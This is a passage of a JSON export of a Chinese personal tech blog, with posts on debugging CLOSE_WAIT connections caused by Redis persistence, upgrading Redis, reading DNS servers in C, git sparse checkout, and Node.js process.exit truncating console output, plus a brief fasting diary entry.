  "title": "linux\u670d\u52a1\u5668\u51fa\u73b0\u5927\u91cfCLOSE_WAIT\u72b6\u6001\u7684\u8fde\u63a5",
  "timestamp": "2015-08-02 03:21:00",
  "tags": [
    "linux",
    "node",
    "redis"
  ],
  "body": "<p>\n\u6628\u5929\u670d\u52a1\u5668\u505c\u6b62\u670d\u52a1\uff0cnode.js\u8fdb\u7a0b\u8017\u5149\u4e86\u670d\u52a1\u5668\u7684\u5185\u5b58\u53caCPU\uff0cnode.js\u8fdb\u7a0b\u5361\u6b7b\u65e0\u6cd5\u88ab <code>kill<\/code> \u6389\uff0c\u6700\u540e\u8981\u6765root\u5e10\u53f7\u5bc6\u7801\uff0c\u76f4\u63a5 <code>kill -9<\/code> \u624d\u7ed3\u675f\u6389\u8fdb\u7a0b\u3002\n<\/p>\n\n<p>\n\u518d\u6b21\u9119\u89c6\u4e00\u4e0b <a href=\"https:\/\/github.com\/nodejitsu\/forever\">forever<\/a> \uff0c\u6740\u4e0d\u6389\u539f\u6765\u7684 node.js \u8fdb\u7a0b\u7ec4\u4e5f\u5c31\u7f62\u4e86\uff0c\u7adf\u7136\u53c8\u62c9\u8d77\u4e86\u4e00\u5957\u65b0\u7684 node.js \u8fdb\u7a0b\u7ec4\u3002\n<\/p>\n\n<p>\n\u7edf\u8ba1\u4e86\u4e00\u4e0b <code>10<\/code> \u4e07\u4e2afd\u90fd\u8017\u5149\u4e86\uff0c\u5176\u4e2d <code>9<\/code> \u4e07\u591a\u4e2a\u4e3a <code>CLOSE_WAIT<\/code> \u72b6\u6001\uff0c\u6b64\u65f6\u670d\u52a1\u5668\u5df2\u7ecf\u65e0\u6cd5\u54cd\u5e94\u8bf7\u6c42\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">CLOSE_WAIT \u72b6\u6001\u4ecb\u7ecd<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u5148\u770b\u4e00\u526fTCP\u8fde\u63a5\u5173\u95ed\u7684\u72b6\u6001\u56fe\uff08 <a href=\"http:\/\/intronetworks.cs.luc.edu\/current\/html\/tcp.html#index-29\">\u6765\u6e90<\/a> \uff09\uff1a\n<\/p>\n\n\n<div class=\"figure\">\n<p><img src=\"..\/static\/tcp_normal_close.png\" alt=\"tcp_normal_close.png\" \/>\n<\/p>\n<\/div>\n\n<p>\n\u88ab\u52a8\u5173\u95ed\u4e00\u65b9\u624d\u4f1a\u51fa\u73b0 <code>CLOSE_WAIT<\/code> \u72b6\u6001\uff0c\u7531\u4e8e\u88ab\u52a8\u5173\u95ed\u65b9\u672a\u8c03\u7528 <code>close<\/code> \u5173\u95edsocket\u5bfc\u81f4\uff0c\u95ee\u9898\u80af\u5b9a\u662f\u7531\u670d\u52a1\u5668\u4ee3\u7801\u5f15\u8d77\u3002\n<\/p>\n\n<p>\n\u68c0\u6d4b\u5230\u5bf9\u7aefsocket\u5173\u95ed\u7136\u540e\u5173\u95ed\u672c\u7aefsocket\u662f\u7531 node.js \u81ea\u884c\u5b8c\u6210\u7684\uff0c\u6700\u5927\u7684\u53ef\u80fd\u662f\u6ca1\u6709\u673a\u4f1a\u6267\u884c <code>close<\/code> \u3002\n<\/p>\n\n<p>\n\u6211\u4eec\u7684\u5e94\u7528\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u6709\u4e00\u4e2atls\u957f\u8fde\u63a5\uff0c\u5f53\u8fde\u63a5\u65ad\u5f00\u65f6\u5ba2\u6237\u7aef\u4f1a\u7b49\u5f853-10\u79d2\u540e\u5c1d\u8bd5\u91cd\u8fde\u670d\u52a1\u5668\uff0c\u5982\u679c\u670d\u52a1\u5668\u51fa\u73b0\u5361\u987f\u4f1a\u5bfc\u81f4\u5ba2\u6237\u7aef\u9891\u7e41\u91cd\u8fde\uff0c\n<\/p>\n\n<p>\n\u5982\u679c\u670d\u52a1\u5668\u6765\u4e0d\u53ca\u5173\u95ed\u8fd9\u4e9b\u8fde\u63a5\uff0c\u5219\u4f1a\u51fa\u73b0 CLOSE_WAIT \u72b6\u6001\u7684\u8fde\u63a5\uff0c\u5360\u7528\u5927\u91cf\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u51cf\u5c11 CLOSE_WAIT \u8d85\u65f6\u65f6\u95f4\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u7f13\u89e3\u8fd9\u4e2a\u95ee\u9898\uff0c\n<\/p>\n\n<p>\n\u4f46\u662f\u5bf9\u4e8e\u6211\u4eec\u8fd9\u79cd\u957f\u8fde\u63a5\u7684\u73af\u5883\uff0c\u5927\u91cfCLOSE_WAIT\u662f\u95ee\u9898\u7684\u8868\u8c61\uff0c\u800c\u975e\u6839\u6e90\u3002\n<\/p>\n\n<p>\n\u53c2\u8003\uff1a\u300a<a href=\"http:\/\/lvxuehu.iteye.com\/blog\/452487\">\u89e3\u51b3CLOSE_WAIT \u95ee\u9898<\/a>\u300b\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5185\u5b58\u53caCPU\u5360\u7528\u5f6a\u5347\u95ee\u9898<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u4f34\u968f\u7740 CLOSE_WAIT \u51fa\u73b0\u7684\u72b6\u51b5\u662f node.js \u8fdb\u7a0b\u5185\u5b58\u53caCPU\u5360\u7528\u8d85\u9ad8\uff0c\u5355node.js\u8fdb\u7a0b\u5185\u5b58\u5360\u7528\u8fbe\u5230 1.5G\uff0cCPU\u5360\u7528 90% \u4ee5\u4e0a\uff0c\u6b64\u65f6\u5e94\u8be5\u4f1a\u5bfc\u81f4 node.js \u54cd\u5e94\u6162\uff0c\n\u6765\u4e0d\u53ca\u5173\u95ed\u8fde\u4e0a\u6765\u7684socket\u3002\n<\/p>\n\n<p>\n\u6240\u4ee5\u89e3\u51b3\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\uff1a\u627e\u51fa\u4ec0\u4e48\u539f\u56e0\u5bfc\u81f4 node.js \u5185\u5b58\u53caCPU 100%\u5360\u7528\u3002\n<\/p>\n\n<p>\n\u60f3\u5230\u7684\u53ef\u80fd\u662fredis\u8d1f\u8f7d\u8fc7\u9ad8\u5f15\u8d77\uff0c\u4ece\u8fd0\u7ef4\u76d1\u63a7\u56fe\u4e0a\u53ef\u4ee5\u770b\u51fa\u4e00\u4e9b\u8e4a\u8df7\uff0cnode.js\u51fa\u95ee\u9898\u65f6redis\u7684\u8fde\u63a5\u6570\u4e5f\u540c\u6837\u5f6a\u5347\uff0c\u800c\u51fa\u95ee\u9898\u7684\u673a\u5668\u4e0a\u521a\u597d\u5c31\u662f\u8dd1redis\u7684\u673a\u5668\uff0c\n\u53e6\u4e00\u53f0\u670d\u52a1\u5668\u4e00\u76f4\u76f8\u5b89\u65e0\u4e8b\uff0c\u6ca1\u6709\u8dd1redis\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u4e00\u6b21\u5348\u591c\u6545\u969c\u5143\u51f6\u6d6e\u51fa\u6c34\u9762<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u5728\u665a\u4e0a\u4e24\u70b9\u7684\u65f6\u5019\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff0c\u540c\u6837\u7684\u73b0\u8c61\uff0c\u7279\u522b\u7559\u610f\u4e86\u4e00\u4e0bredis\u7684\u7edf\u8ba1\uff0c\u8bf7\u6c42\u901f\u5ea6\u5f88\u4f4e\uff0c\u53ea\u67091200\uff0c\u5e73\u65f6\u90fd\u662f5000\u3002\u5076\u7136\u5728\u8fdb\u7a0b\u5217\u8868\u4e2d\u53d1\u73b0\u4e86 redis-rdb-bgsave \u7684\u8eab\u5f71\uff0c\n\u4e0d\u65ad\u5730\u6267\u884cps\u770b\u8fdb\u7a0b\u5217\u8868\uff0c\u53d1\u73b0 redis-rdb-bgsave \u8fdb\u7a0b\u4e0d\u65ad\u5730\u51fa\u73b0\uff0c\u67e5\u770bredis\u7684\u6301\u4e45\u5316\u914d\u7f6e\u5982\u4e0b\uff1a\n<\/p>\n\n<pre class=\"example\">\nsave 900 1\nsave 300 10\nsave 60 10000\n<\/pre>\n\n<p>\n\u6211\u4eec\u7684\u7cfb\u7edf\u6709\u5927\u91cf\u7684redis\uff0c1\u5206\u949f\u80af\u5b9a\u8fc7\u4e07\uff0c\u8fd9\u6837redis\u6301\u4e45\u5316\u53d8\u662f\u5e38\u6001\u4e86\uff0c\u800c\u4e14\u7531\u4e8e\u7528\u7684\u662f\u673a\u68b0\u786c\u76d8\uff0c\u6301\u4e45\u5316\u80af\u5b9a\u4f1a\u5f15\u8d77\u7cfb\u7edf\u5361\u987f\uff0c\u5148\u5c06\u5b83\u8c03\u6574\u4e3a15\u5206\u949f\u6700\u591a\u6301\u4e45\u5316\u4e00\u6b21\uff1a\n<\/p>\n\n<pre class=\"example\">\nconfig set save \"900 1\"\n<\/pre>\n\n<p>\n\u91cd\u542f\u7a0b\u5e8f\u91ca\u653e\u8d44\u6e90\u540e\u7cfb\u7edf\u5f00\u59cb\u6b63\u5e38\u54cd\u5e94\uff0c\u4f46\u662f10\u591a\u5206\u949f\u540e\u7cfb\u7edf\u518d\u6b21\u65e0\u54cd\u5e94\uff0c\u624d\u60f3\u8d77\u4e00\u5219\u7ecf\u9a8c\u6559\u8bad\uff1a\n<\/p>\n\n<pre class=\"example\">\n     \u8dd1redis\u7684\u673a\u5668\u81f3\u5c11\u8981\u9884\u7559\u548credis\u5360\u7528\u5185\u5b58\u540c\u6837\u5927\u5c0f\u7684\u7a7a\u95f2\u5185\u5b58\u7a7a\u95f4\uff0credis RDB\u6301\u4e45\u5316\u8fdb\u884cfork\u65f6\u6700\u574f\u4f1a\u5360\u7528\u53cc\u500d\u5185\u5b58\uff0c\u5185\u5b58\u4e0d\u8db3\u5c31\u4f1a\u52a8\u7528\u4ea4\u6362\u5206\u533a\uff0c\u7cfb\u7edf\u6027\u80fd\u6025\u5267\u4e0b\u964d\u3002\n<\/pre>\n\n<p>\n\u4e8e\u662f\uff0c\u7acb\u5373\u6539\u914d\u7f6e\u5c06redis\u6240\u5728\u673a\u5668\u4e0a\u7684node.js cluster\u8fdb\u7a0b\u6570\u8c03\u5c0f\uff0c\u817e\u51fa\u5927\u628a\u5185\u5b58\uff0c\u603b\u7b97\u6ca1\u6709\u518d\u51fa\u73b0\u95ee\u9898\uff0c\u4eca\u665a\u7ec8\u4e8e\u53ef\u4ee5\u5165\u7720\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u66f4\u591a\u7591\u95ee<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li>\u6211\u4eec\u7684node.js\u8fdb\u7a0b\u4e3a\u4ec0\u4e48\u5e38\u5e38\u4f1a\u5360\u7528\u5f88\u591a\u5185\u5b58\uff1f\n<\/li>\n\n<li>netstat\u4e2d\u770b\u5230CLOSE_WAIT\u72b6\u6001\u7684\u8fde\u63a5\u8f93\u5165\u7f13\u51b2\u5f80\u5f80\u6709\u6570\u636e\uff0c\u800cESTABLISHED\u72b6\u6001\u7684\u8fde\u63a5\u8bfb\u5199\u7f13\u51b2\u533a\u5f80\u5f80\u4e3a\u7a7a\uff0c\u4e3a\u4ec0\u4e48\uff1f\n<\/li>\n\n<li>node.js\u5361\u987f\u65f6forever\u6740\u4e0d\u6b7b\u53cd\u800c\u542f\u52a8\u4e86\u65b0\u5b9e\u4f8b\u5e2e\u5012\u5fd9\uff0cpm2\u5c31\u4e00\u5b9a\u80fd\u591f\u89e3\u51b3\u5417\uff1f\n<\/li>\n\n<li>redis\u6301\u4e45\u5316\u5f15\u8d77\u670d\u52a1\u6302\u6389\uff0c\u5df2\u7ecf\u662f\u5728\u7b2c\u4e8c\u4e2a\u9879\u76ee\u4e2d\u9047\u5230\u4e86\uff0c\u7ec8\u6781\u89e3\u51b3\u65b9\u6848\u662f\u4ec0\u4e48\uff1f\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5347\u7ea7redis\u5230\u6700\u65b0\u7248\u672c\u7684\u8fc7\u7a0b",
  "timestamp": "2015-08-10 17:56:00",
  "tags": [
    "redis"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u7f16\u8bd1\u6700\u65b0\u7248\u672c\u7684redis\uff0c\u6682\u4e0d\u8981\u5b89\u88c5\n\n<p>\n\u53c2\u89c1\u300a<a href=\"http:7f168bd15b8988c5-redis.html\">\u7f16\u8bd1\u5b89\u88c5redis<\/a>\u300b\n<\/p>\n<\/li>\n\n<li>\u5c06\u65e7\u7248\u7684redis.conf\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u9879\u5408\u5165\u65b0\u7248\u672credis.conf\n\n<p>\n\u53ef\u80fd\u9700\u8981\u63d0\u524d\u786e\u8ba4\u4e00\u4e0b\u65b0\u7248\u672credis\u662f\u5426\u517c\u5bb9\u65e7\u7248\u672c\u6570\u636e\u6587\u4ef6\u3002\n<\/p>\n<\/li>\n\n<li>\u5378\u8f7d\u5e76\u505c\u6b62\u65e7\u7248\u672credis\n<\/li>\n\n<li>\u5b89\u88c5\u65b0\u7248\u672credis\n\n<p>\n\u53c2\u89c1\u300a<a href=\"http:7f168bd15b8988c5-redis.html\">\u7f16\u8bd1\u5b89\u88c5redis<\/a>\u300b\n<\/p>\n<\/li>\n\n<li>\u542f\u52a8\u65b0\u7248\u672credis\n<\/li>\n<\/ul>\n"
},
{
  "title": "linux\u4e0b\u7f16\u7a0b\u83b7\u53d6\/etc\/resolv.conf\u4e2d\u7684\u57df\u540d\u89e3\u6790\u670d\u52a1\u5668",
  "timestamp": "2015-08-14 18:01:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n\u76f4\u63a5\u4e0a\u4ee3\u7801\u5427\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;unistd.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;sys\/types.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;netinet\/in.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;arpa\/inet.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;arpa\/nameser.h&gt;<\/span>\n<span style=\"color: #cc99cc;\">#include<\/span> <span style=\"color: #66cccc;\">&lt;resolv.h&gt;<\/span>\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">main<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">argc<\/span>, <span style=\"color: #6699cc;\">char<\/span> *<span style=\"color: #ffcc66;\">argv<\/span>[])\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">struct<\/span> <span style=\"color: #6699cc;\">__res_state<\/span> <span style=\"color: #ffcc66;\">res<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   res.options &amp;= ~ RES_INIT;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">err<\/span> = res_ninit(&amp;res);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"res_init error: %d\\n\"<\/span>, err);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> err;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">char<\/span> <span style=\"color: #ffcc66;\">ip<\/span>[16];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>(<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">i<\/span> = 0 ; i &lt; res.nscount; ++i) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ip[0] = <span style=\"color: #66cccc;\">'\\0'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #6699cc;\">!<\/span> inet_ntop(AF_INET, &amp;res.nsaddr_list[i].sin_addr, ip, <span style=\"color: #99cc99;\">sizeof<\/span>(ip))) <span style=\"text-decoration: underline;\">{<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   perror(<span style=\"color: #66cccc;\">\"inet_ntop\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">continue<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   printf(<span style=\"color: #66cccc;\">\"ip: %s\\n\"<\/span>, ip);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   res_nclose(&amp;res);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n}\n<\/pre>\n<\/div>\n\n<ul class=\"org-ul\">\n<li>\u53c2\u8003\n\n<p>\n\u300a<a href=\"http:\/\/stackoverflow.com\/questions\/2916675\/programmatically-obtain-dns-servers-of-host\">Programmatically obtain DNS servers of host<\/a>\u300b<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u8f7b\u65ad\u98df\u65e5\uff082015-8-25\uff09",
  "timestamp": "2015-08-25 14:43:00",
  "tags": [
    "\u8f7b\u65ad\u98df"
  ],
  "body": "<p>\n\u4eca\u5929\u662f\u8f7b\u65ad\u98df\u65e5\uff0c\u611f\u89c9\u5f88\u81ea\u7136\uff0c\u65e9\u4e0a\u7ed9\u5c0f\u5b69\u5582\u996d\u65f6\u4e5f\u6ca1\u6709\u987a\u4fbf\u5403\u4e00\u70b9\uff0c\u4f53\u91cd\u5df2\u7ecf\u7a33\u5b9a\u572864-65\u516c\u65a4\uff0c\u6700\u8fd1\u51e0\u5468\u5df2\u7ecf\u8c03\u6574\u4e3a\u4e00\u5468\u4e00\u5929\u65ad\u98df\uff0c\u76ee\u524d\u7684\u4f53\u91cd\u5df2\u7ecf\u6bd4\u8f83\u5408\u7406\uff0c\u7b49\u808c\u8089\u7ed3\u5b9e\u4e00\u70b9\u518d\u6062\u590d\u5230\u4e00\u5468\u4e8c\u5929\u65ad\u98df\u7ee7\u7eed\u51cf\u8f7b\u4e00\u4e9b\u4f53\u91cd\uff0c\u4ecd\u7136\u7528\u7684\u662f\u524d\u4e00\u5929\u665a\u9910\u548c\u7b2c\u4e8c\u5929\u65e9\u9910\u4e0d\u5403\u7684\u65b9\u6cd5\uff0c\u65ad\u98df\u65f6\u95f4\u5927\u90e8\u5206\u5728\u7761\u89c9\u5bb9\u6613\u65bd\u884c\u3002\n<\/p>\n\n<p>\nCheers!<\/p>\n"
},
{
  "title": "\u62c9\u53d6git\u4ed3\u5e93\u7684\u5b50\u76ee\u5f55",
  "timestamp": "2015-08-26 18:17:00",
  "tags": [
    "git"
  ],
  "body": "<p>\n\u6211\u4eec\u7684git\u4ed3\u5e93\u76ee\u5f55\u7ed3\u6784\uff1a\n<\/p>\n\n<pre class=\"example\">\nhttp:\/\/server\/company.git +\n                          |\n                          +- project1\n                          |\n                          +- project2\n                          |\n                          +- project3\n                          |\n                          +- ...\n<\/pre>\n\n<p>\n\u4ee5\u524d\u4f7f\u7528svn\u7684\u65f6\u5019\u662f\u53ef\u4ee5\u76f4\u63a5\u62c9\u53d6\u5176\u4e2d\u4e00\u4e2a\u5b50\u9879\u76ee\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">svn checkout http:\/\/server\/company.git\/project1\n<\/pre>\n<\/div>\n\n<p>\n\u4f46\u662fgit\u597d\u50cf\u4e0d\u652f\u6301\u8fd9\u79cd\u7528\u6cd5\uff0c\u7f51\u4e0a\u627e\u4e86\u4e00\u4e0b\u76f8\u5173\u8d44\u6599\uff0c\u53ef\u4ee5\u501f\u52a9git\u7684 <code>Sparse checkout<\/code> \u5b9e\u73b0\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone http:\/\/server\/company.git --no-checkout\n<span style=\"color: #cc99cc;\">cd<\/span> company\ngit config core.sparsecheckout true\n<span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">\"project1\/\"<\/span> &gt; .git\/info\/sparse-checkout\ngit checkout --\n<span style=\"color: #cc99cc;\">cd<\/span> ..\nln -s company\/project1 .\/\n<\/pre>\n<\/div>\n\n<ul class=\"org-ul\">\n<li>\u53c2\u8003\n\n<p>\n\u300a<a href=\"http:\/\/stackoverflow.com\/questions\/4114887\/is-it-possible-to-do-a-sparse-checkout-without-checking-out-the-whole-repository\">Is it possible to do a sparse checkout without checking out the whole repository first?<\/a>\u300b<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "process.exit\u5bfc\u81f4\u7684\u63a7\u5236\u53f0\u8f93\u51fa\u4e0d\u5168",
  "timestamp": "2015-08-27 17:03:00",
  "tags": [
    "node"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u5148\u4e0a\u6848\u4f8b\u7a0b\u5e8f\uff1a\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">for<\/span>(<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">i<\/span> = 0; i &lt; 10000; ++i) {\n<span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">\"this is long long long long long long long long long long long <\/span><span style=\"color: #66cccc; text-decoration: underline;\">long long long long long long long long long long long long long long long long long long log \"<\/span><span style=\"text-decoration: underline;\"> + i);<\/span>\n}\nprocess.exit(0);\n<\/pre>\n<\/div>\n\n<p>\n\u8fd9\u4e2a\u7a0b\u5e8f\u8f93\u51fa10000\u884c\u65e5\u5fd7\uff0c\u7136\u540e\u7ed3\u675f\u8fdb\u7a0b\u3002\n<\/p>\n<\/li>\n\n<li><code>Emacs Shell<\/code> \u4ee5\u53ca <code>GNOME Terminal<\/code> \u4e0b\u8fd0\u884c\u7ed3\u679c\uff08\u7701\u7565\u4e2d\u95f4\u90e8\u5206\u8f93\u51fa\uff09\uff1a\n\n<pre class=\"example\">\n$ node \/home\/tangxinfa\/Examples\/test_exit.js\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0\n...\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 119\n$\n<\/pre>\n\n<p>\n\u7a0b\u5e8f\u53ea\u8f93\u51fa\u4e86\u524d\u9762200\u884c\u65e5\u5fd7\u3002\n<\/p>\n<\/li>\n\n<li>\u6309 <code>Ctrl+Alt+F2<\/code> \u8fdb\u51652\u53f7\u7cfb\u7edf\u7ec8\u7aef\u4e0b\u8fd0\u884c\u7ed3\u679c\uff08\u7701\u7565\u4e2d\u95f4\u90e8\u5206\u8f93\u51fa\uff09\uff1a\n\n<pre class=\"example\">\n$ node \/home\/tangxinfa\/Examples\/test_exit.js\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0\n...\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999\n$\n<\/pre>\n\n<p>\n\u7a0b\u5e8f\u8f93\u51fa\u4e86\u5b8c\u6574\u7684\u65e5\u5fd7\u3002\n<\/p>\n<\/li>\n\n<li>\u65e5\u5fd7\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u65f6 <code>Emacs Shell<\/code> \u4ee5\u53ca <code>GNOME Terminal<\/code> \u4e0b\u8fd0\u884c\u7ed3\u679c\uff08\u7701\u7565\u4e2d\u95f4\u90e8\u5206\u8f93\u51fa\uff09\uff1a\n\n<pre class=\"example\">\n$ node \/home\/tangxinfa\/Examples\/test_exit.js &gt; \/tmp\/test_exit.log\n$ tail -1 \/tmp\/test_exit.log\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999\n$\n<\/pre>\n\n<p>\n\u7a0b\u5e8f\u8f93\u51fa\u4e86\u5b8c\u6574\u7684\u65e5\u5fd7\u3002\n<\/p>\n<\/li>\n\n<li>\u539f\u56e0\n\n<p>\n\u5982\u679c\u8f93\u51fa\u76ee\u6807\u4e3a\u7ec8\u7aef\uff08 <code>Emacs Shell<\/code> \u4ee5\u53ca <code>GNOME Terminal<\/code> \u5e76\u975e\u771f\u6b63\u7684\u7ec8\u7aef\uff09\u6216\u6587\u4ef6\u65f6\uff0cconsole\u51fd\u6570\u662f\u540c\u6b65\u7684\uff08\u907f\u514d\u7a0b\u5e8f\u8fc7\u65e9\u9000\u51fa\u5bfc\u81f4\u4e22\u6d88\u606f\uff09\uff0c\u76ee\u6807\u4e3a\u7ba1\u9053\u65f6\u5219\u4e3a\u5f02\u6b65\uff08\u907f\u514d\u957f\u65f6\u95f4\u5835\u585e\uff09\u3002\n<\/p>\n\n<blockquote>\n<p>\nThe console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).\n<\/p>\n<\/blockquote>\n\n<p>\n\u53c2\u8003\uff1a\u300a<a href=\"http:\/\/stackoverflow.com\/questions\/18748164\/process-exit0-output-disappears\">process.exit(0): output disappears?<\/a>\u300b\n<\/p>\n<\/li>\n\n<li>\u89e3\u51b3\u65b9\u6848\n\n<p>\n\u8c03\u7528 <code>process.exit<\/code> \u65f6\u786e\u4fdd\u8f93\u51fa\u5b8c\u6bd5\uff0c\u5c01\u88c5\u5982\u4e0b\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span class=\"linenr\">1: <\/span><span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">Safe exit. Makesure log output flushed to console.<\/span>\n<span class=\"linenr\">2: <\/span><span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">exit<\/span>(<span style=\"color: #ffcc66;\">code<\/span>) {\n<span class=\"linenr\">3: <\/span><span style=\"background-color: #515151;\"> <\/span>   process.stdout.write(<span style=\"color: #66cccc;\">''<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {\n<span id=\"coderef-stderr-write\" class=\"coderef-off\"><span class=\"linenr\">4: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   process.stderr.write(<span style=\"color: #66cccc;\">''<\/span>, <span style=\"color: #99cc99;\">function<\/span> () {<\/span>\n<span class=\"linenr\">5: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   process.exit(code);\n<span class=\"linenr\">6: <\/span><span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   });\n<span class=\"linenr\">7: <\/span><span style=\"background-color: #515151;\"> <\/span>   });\n<span class=\"linenr\">8: <\/span>}\n<\/pre>\n<\/div>\n\n<p>\n\u6ce8\u610f\uff0c\u4e0a\u9762\u7684 <code>exit<\/code> \u51fd\u6570\u4e0d\u4f1a\u50cf <code>process.exit<\/code> \u4e00\u6837\u7acb\u5373\u7ec8\u6b62\u7a0b\u5e8f\uff0c\u8bf7\u5c06 <code>process.exit<\/code> \u66ff\u6362\u4e3a  <code>return exit<\/code> \u3002\n<\/p>\n\n<p>\n\u8b66\u544a\uff1a\u5728 <code>node.js<\/code> \u5f00\u53d1\u7684\u4e00\u4e2a\u540e\u53f0\u670d\u52a1\uff08\u4f7f\u7528 <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u7ba1\u7406\u8fdb\u7a0b\uff09\u4e2d\uff0c <code>process.stderr.write<\/code> (<i>stderr-write<\/i>) \u7684\u56de\u8c03\u51fd\u6570\u672a\u8c03\u7528\uff0c\n\u5bfc\u81f4\u7a0b\u5e8f\u672a\u80fd\u5f02\u5e38\u9000\u51fa\uff0c\u800c\u5728\u7ec8\u7aef\u6267\u884c\u7684\u547d\u4ee4\u884c\u811a\u672c\u4e2d\u5219\u5de5\u4f5c\u6b63\u5e38\uff0c\u539f\u56e0\u5c1a\u672a\u67e5\u660e\uff08\u53ef\u80fd\u662f\u7528\u6237\u6743\u9650\u5bfc\u81f4\u5199\u65e5\u5fd7\u5361\u4f4f\uff09\u3002\n<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "node.js\u5e94\u7528\u9519\u8bef\u5904\u7406",
  "timestamp": "2015-10-30 18:08:00",
  "tags": [
    "node"
  ],
